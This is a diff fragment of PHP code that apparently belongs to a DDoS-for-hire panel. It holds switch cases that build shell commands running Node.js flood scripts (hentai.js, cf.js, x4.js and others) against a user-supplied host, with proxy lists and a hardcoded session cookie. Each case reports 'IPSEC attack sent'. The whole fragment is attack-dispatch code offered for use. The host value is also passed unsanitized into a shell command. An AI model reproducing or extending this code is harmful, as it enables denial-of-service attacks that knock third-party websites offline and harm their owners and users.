@@ -1,0 +1,35 @@
+		case 'HTTP-DOWN':
+                 $command = "node hentai.js {$this->get->host} http.txt {$this->get->time} GET";
+                 $this->message = 'IPSEC attack sent';
+                break;
+
+      case 'HTTP-SPAM':
+                 $command = "node http-geminy.js {$this->get->host} http.txt {$this->get->time} GET PHPSESSID:tisv10jeevnd5k7lrbt1a5h4l7";
+                 $this->message = 'IPSEC attack sent';
+                break;
+                
+      case 'CF-BASIC':
+                 $command = "node cf.js {$this->get->host} {$this->get->time} 100 http.txt";
+                 $this->message = 'IPSEC attack sent';
+                break;
+
+      case 'HTTP-SOCKET':
+                 $command = "node xd.js {$this->get->host} proxies.txt {$this->get->time} GET";
+                 $this->message = 'IPSEC attack sent';
+                break;
+
+      case 'HTTP-REQUEST':
+                 $command = "node x5.js {$this->get->host} {$this->get->time}";
+                 $this->message = 'IPSEC attack sent';
+                break;
+
+      case 'HTTP-FLOOD':
+                 $command = "node x4.js {$this->get->host} http.txt {$this->get->time} GET";
+                 $this->message = 'IPSEC attack sent';
+                break;
+
+      case 'HTTP-TOP':
+                 $command = "node x2.js {$this->get->host} http.txt {$this->get->time} GET";
+                 $this->message = 'IPSEC attack sent';
+                break;
+
